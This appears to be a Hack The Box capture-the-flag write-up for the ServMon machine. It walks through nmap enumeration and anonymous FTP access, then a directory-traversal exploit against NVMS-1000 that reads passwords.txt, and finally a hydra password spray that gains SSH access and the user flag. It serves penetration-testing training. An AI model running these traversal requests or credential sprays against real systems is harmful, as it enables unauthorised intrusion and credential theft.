# ServMon

## Enumeration

NMAP Scan - All Ports:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report "10.10.10.184"

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
22/tcp    open  ssh          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
6063/tcp  open  x11          syn-ack ttl 127
6699/tcp  open  napster      syn-ack ttl 127
8443/tcp  open  https-alt    syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
```

NMAP Scan Port Services:

```bash
nmap -sV -sC -Pn -v -oN nmap-report "10.10.10.184" -p 21,22,80,135,139,445,6063,6699,8443,49667,49670

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
|_SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     jgf4
|     /3KLCffK5o8
|     workers
|_    jobs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: NSClient++
|_Requested resource was /index.html
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=5/12%Time=6640A9FF%P=x86_64-pc-linux-gnu%r(N
SF:ULL,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\
SF:r\n\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20
SF:text/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo
SF::\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x
SF:20XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml
SF:1/DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w
SF:3\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x
SF:20\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n
SF:\x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\
SF:n")%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/
SF:html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20
SF:\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHT
SF:ML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD
SF:/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.or
SF:g/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x2
SF:0\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\
SF:x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r
SF:(RTSPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\
SF:r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x2
SF:01\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtm
SF:l1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/199
SF:9/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20
SF:\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x
SF:20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=5/12%Time=6640AA08%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocat
SF:ion:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0jgf4\0\0\0\0/3KLCffK5o8
SF:\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x188\x12\x0f")
SF:%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDoc
SF:ument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nCon
SF:tent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"
SF:HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20fou
SF:nd")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\n
SF:Document\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-12T11:39:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 3s
```

## FTP - Anonymous Login

NMAP scan results show that Anonymous login is enabled for FTP. 

```bash
> ftp 10.10.10.184

Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
```

The FTP service with Anonymous login allowed us to access a `Users` directory which contained two directories called `Nadine` and `Nathan`. The `Nadine` directory contained a txt file titled `Confidential.txt` which indicates a file called `passwords.txt` is stored on the user Nathan's Desktop.

```bash
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

The `Nathan` directory contained a txt file titled `Notes to do.txt`, which indicates that Nathan did change his password but may not have removed the `passwords.txt` file from his desktop and perform some other tasks.

```bash
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

## HTTP Website 

Navigating to `http://10.10.10.184` returns a login page for NVMS-1000, which was mentioned in the txt file titled `Notes to do.txt` found earlier. 

![Login Page](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/ServMon/Images/Login%20Page.png)

Searching online for NVMS-1000 reveals multiple exploit scripts for Directory Traversal attacks. ExploitDB provides a proof of concept, which we are able to recreate via Burpsuite:

* [ExploitDB - POC](https://www.exploit-db.com/exploits/47774)

In BurpSuite, I captured a HTTP GET request for the login page and tested for Directory traversal:

```http
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
```

This returns a 200 HTTP response which contains the contents of `win.ini`.

```http
HTTP/1.1 200 OK
Content-type: 
Content-Length: 92
Connection: close
AuthInfo: 

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Now that we know the Directory Traversal attack works, we can manually exploit it to recover the contents of `C:/Users/Nathan/Desktop/passwords.txt`, as hinted at earlier in the file titled `Confidential.txt` found via FTP anonymous login vulnerability.

```http
GET /../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt HTTP/1.1
```

In the HTTP response, I can see the list of passwords:

```http
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Attempting to login via the NVMS-1000 login page as the user `Nathan` with the passwords above does not work. In the txt file titled `Notes to do.txt`, we can see that Nathan has changed the password for NVMS and locked down access.

## SSH Login - User Flag

The passwords list was tested against both users and a successful login was found for the user `nadine`:

```bash
> hydra 10.10.10.184 ssh -l nadine -P passwords.txt -f -V

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-12 13:43:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "1nsp3ctTh3Way2Mars!" - 1 of 7 [child 0] (0/0)
[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "Th3r34r3To0M4nyTrait0r5!" - 2 of 7 [child 1] (0/0)
[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "B3WithM30r4ga1n5tMe" - 3 of 7 [child 2] (0/0)
[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "L1k3B1gBut7s@W0rk" - 4 of 7 [child 3] (0/0)
[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "0nly7h3y0unGWi11F0l10w" - 5 of 7 [child 4] (0/0)
[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "IfH3s4b0Utg0t0H1sH0me" - 6 of 7 [child 5] (0/0)
[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "Gr4etN3w5w17hMySk1Pa5$" - 7 of 7 [child 6] (0/0)
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
```

I can login via SSH and recover the first flag.

```bash
ssh nadine@10.10.10.184

Directory of C:\Users\Nadine\Desktop              
                                                   
02/28/2022  08:05 PM    <DIR>          .           
02/28/2022  08:05 PM    <DIR>          ..          
05/12/2024  04:32 AM                34 user.txt    
               1 File(s)             34 bytes      
               2 Dir(s)   6,130,212,864 bytes free
```





















